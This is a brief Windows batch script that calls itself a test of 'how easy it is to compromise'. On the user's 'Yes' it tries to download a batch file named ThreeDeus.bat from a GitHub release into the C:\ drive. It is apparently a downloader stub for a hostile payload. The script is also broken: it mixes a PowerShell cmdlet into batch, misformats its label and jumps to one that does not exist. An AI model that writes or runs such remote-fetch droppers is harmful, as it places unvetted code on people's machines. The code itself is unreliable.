@echo off
color 0a
echo So this is a test to see how easy it is to compromise
echo.
echo (1 Yes
echo (2 No
set /p web=Type option:
if "%web%"=="1" goto pain
if "%web%"=="2" exit
goto home

pain:
Invoke-WebRequest -Uri "https://github.com/jijipwn/ThreeDeus/releases/download/5.0B-1/ThreeDeus.bat" -OutFile "C:\"